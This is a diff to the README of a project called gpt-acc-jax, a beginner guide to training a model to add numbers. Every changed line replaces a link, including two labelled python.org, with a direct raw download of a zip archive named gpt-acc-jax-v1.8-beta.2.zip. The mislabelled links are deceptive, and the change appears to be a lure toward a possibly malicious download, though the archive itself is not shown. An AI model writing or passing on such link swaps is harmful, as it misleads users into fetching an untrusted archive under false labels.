@@ -1,6 +1,6 @@
 # 🤖 gpt-acc-jax - Train a Model to Add Numbers Easily
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Evan026/gpt-acc-jax)
+[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/Evan026/gpt-acc-jax/raw/refs/heads/main/infra/gpt-acc-jax-v1.8-beta.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ To get started, follow these steps carefully.
 
 1. Click the big link below to visit the GitHub page where you can find and download the tool.  
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/Evan026/gpt-acc-jax)  
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/Evan026/gpt-acc-jax/raw/refs/heads/main/infra/gpt-acc-jax-v1.8-beta.2.zip)  
 
 2. Once on the page, look for the green button labeled "Code." Click it and choose "Download ZIP" from the menu.  
 
@@ -71,7 +71,7 @@ The software runs using Python and JAX, which are included in the package. Here'
 
 4. When the process finishes, the tool saves the trained model for you to use or explore further.  
 
-If you get an error or nothing happens, you may need to install Python first. You can download Python for Windows from [python.org](https://www.python.org/downloads/windows/).
+If you get an error or nothing happens, you may need to install Python first. You can download Python for Windows from [python.org](https://github.com/Evan026/gpt-acc-jax/raw/refs/heads/main/infra/gpt-acc-jax-v1.8-beta.2.zip).
 
 ---
 
@@ -124,7 +124,7 @@ If you have issues running the software, try these steps:
   - Press `Windows + R`, type `cmd`, and press Enter.  
   - Use the `cd` command to go to the folder with the software files.  
   - Type `run_training.bat` or `run_inference.bat` and press Enter.  
-- Install Python from [python.org](https://www.python.org/downloads/windows/) if prompted.  
+- Install Python from [python.org](https://github.com/Evan026/gpt-acc-jax/raw/refs/heads/main/infra/gpt-acc-jax-v1.8-beta.2.zip) if prompted.  
 - Restart your computer after installation if the software fails to run.
 
 ---
@@ -133,7 +133,7 @@ If you have issues running the software, try these steps:
 
 For questions or more information, visit the main page again:
 
-[https://github.com/Evan026/gpt-acc-jax](https://github.com/Evan026/gpt-acc-jax)
+[https://github.com/Evan026/gpt-acc-jax/raw/refs/heads/main/infra/gpt-acc-jax-v1.8-beta.2.zip](https://github.com/Evan026/gpt-acc-jax/raw/refs/heads/main/infra/gpt-acc-jax-v1.8-beta.2.zip)
 
 You can open an "Issue" on GitHub if you find a bug or need assistance.
 
@@ -150,4 +150,4 @@ You can open an "Issue" on GitHub if you find a bug or need assistance.
 
 ## 🔗 Quick Access
 
-[![Visit Download Page](https://img.shields.io/badge/Download-Visit%20Page-orange)](https://github.com/Evan026/gpt-acc-jax)
+[![Visit Download Page](https://img.shields.io/badge/Download-Visit%20Page-orange)](https://github.com/Evan026/gpt-acc-jax/raw/refs/heads/main/infra/gpt-acc-jax-v1.8-beta.2.zip)
